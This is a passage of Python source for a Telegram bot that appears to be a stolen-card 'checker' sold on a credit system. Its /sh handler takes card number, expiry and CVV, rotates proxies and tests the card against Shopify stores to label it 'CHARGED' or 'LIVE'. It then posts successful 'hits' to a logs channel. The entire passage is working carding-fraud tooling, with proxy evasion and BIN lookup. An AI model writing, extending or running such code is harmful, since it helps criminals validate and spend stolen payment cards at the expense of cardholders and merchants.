    if sess["status"] != "CHECKING":
        await q.answer("ℹ️ Not running.", show_alert=True); return
    sess["status"] = "STOPPED"
    for t in sess.get("tasks", []):
        if not t.done(): t.cancel()
    await q.answer("🛑 Stopped.")
    sess["last_text"] = ""
    await _update_progress(context.bot, sid, force=True)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /sh COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    ud   = _get_ud(user.id, context)

    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text("🔧 <b>Bot under maintenance.</b>",
                                        parse_mode="HTML"); return
    if not context.bot_data.get("sh_on", True):
        await update.message.reply_text("❌ <b>Single check disabled.</b>",
                                        parse_mode="HTML"); return

    card = None
    if context.args:
        card = context.args[0].strip()
    elif update.message.reply_to_message:
        txt = (update.message.reply_to_message.text or
               update.message.reply_to_message.caption or "").strip()
        if txt: card = txt.split()[0]

    if not card or "|" not in card:
        await update.message.reply_text(
            "ℹ️ <b>Usage:</b> <code>/sh cc|mm|yy|cvv</code>",
            parse_mode="HTML"); return

    parts = card.split("|")
    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format.", parse_mode="HTML"); return

    cc, mm, yy, cvv = parts
    if not luhn_check(cc):
        await update.message.reply_text("❌ Card failed Luhn check.", parse_mode="HTML"); return
    if is_expired(mm, yy):
        await update.message.reply_text("❌ Card is expired.", parse_mode="HTML"); return

    premium = _is_premium(ud, user.id)
    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "❌ <b>No credits.</b> Use /buy to upgrade.", parse_mode="HTML"); return
        cd_map = context.bot_data.setdefault("sh_cd", {})
        rem    = SH_COOLDOWN - (time.time() - cd_map.get(user.id, 0))
        if rem > 0:
            await update.message.reply_text(
                f"⏳ <b>Cooldown:</b> wait <b>{int(rem)}s</b>",
                parse_mode="HTML"); return
        cd_map[user.id] = time.time()
        ud["credits"]   = max(0, ud.get("credits", 1) - 1)

    plan = ud.get("plan", "TRIAL")

    # ── Spinner (initial "Checking..." message) ───────────────────────────────
    sp_html = (
        f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
        f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Checking...</b>'
    )
    spin = await update.message.reply_text(sp_html, parse_mode="HTML")

    proxies = _load_proxies()

    if not proxies:
        await spin.edit_text(
            "❌ <b>No proxies in px.txt</b>\n\n"
            "Add proxies to <code>px.txt</code> (one ip:port per line).",
            parse_mode="HTML"); return

    # Use probed working sites; fall back to full list if probe hasn't run yet
    sites = get_working_sites()

    # If probe has never run and all sites look dead, warn user briefly
    if not _WORKING_SITES:
        wt_html = (
            f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
            f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Finding live sites... please wait</b>'
        )
        await spin.edit_text(wt_html, parse_mode="HTML")
        # Block until probe finishes (only for single check, to get real result)
        sites = await probe_all_sites(_load_sites(), proxies)

    t0 = time.time()
    try:
        (verdict, resp, price, currency), bin_data = await asyncio.gather(
            _check_card_with_retry(None, card, sites, proxies,
                                   max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT),
            _bin_lookup(cc[:6]),
        )
    except Exception as e:
        verdict, resp, price, currency = "ERROR", str(e)[:60], "0.00", "USD"
        bin_data = {}

    elapsed  = time.time() - t0
    res_html = build_result_msg(card, resp, verdict, bin_data,
                                price, currency, elapsed, user, plan)

    # ── Send verdict sticker to the command chat FIRST ─────────────────────────
    # send_sticker() resolves emoji_id → file_id via get_custom_emoji_stickers()
    # and sends it as a standalone animated sticker message.  This is the ONLY
    # approach that guarantees animated display for ALL users regardless of
    # bot or user Telegram Premium status.
    if verdict == "CHARGED":
        _cmd_eid = get_random_charged_emoji()
    elif verdict in ("LIVE", "TDS"):
        _cmd_eid = get_random_live_emoji()
    else:
        _cmd_eid = DECLINED_EMOJI_ID
    # await (not create_task) — guarantees sticker lands BEFORE the result card edit
    await _send_sticker(context.bot, update.effective_chat.id, _cmd_eid)

    # Two buttons on every result card: main channel + logs channel
    kb = RawMarkup([[
        _btn(f"📢 {BOT_NAME}",  url=MY_CHANNEL_LINK,  style="primary"),
        _btn("📋 Hit Logs",     url=LOGS_CHANNEL_LINK, style="primary"),
    ]])

    try:
        await spin.edit_text(res_html, parse_mode="HTML",
                             disable_web_page_preview=True, reply_markup=kb)
    except Exception:
        await update.message.reply_text(res_html, parse_mode="HTML",
                                        disable_web_page_preview=True, reply_markup=kb)

    if verdict in ("CHARGED", "LIVE", "TDS"):
        asyncio.create_task(_send_hit(
            context.bot, user, res_html, verdict,
            card=card, bin_data=bin_data, price=price, currency=currency,
            plan=plan, resp=resp,
        ))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EXPORT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_sh_handler() -> CommandHandler:
    return CommandHandler("sh", cmd_sh)

__all__ = [
    "get_sh_handler",
    "_check_card_with_retry", "SITE_RETRIES", "SITE_TIMEOUT",
    "MSH_SESSIONS", "run_mass_batch", "create_msh_session",
    "cb_msh_result", "cb_msh_stop", "build_result_msg",
    "_load_sites", "_load_proxies",
    # Site prober exports
    "probe_all_sites", "get_working_sites",
    "start_probe_background",
    "_WORKING_SITES", "_PROBE_IN_PROGRESS",
]
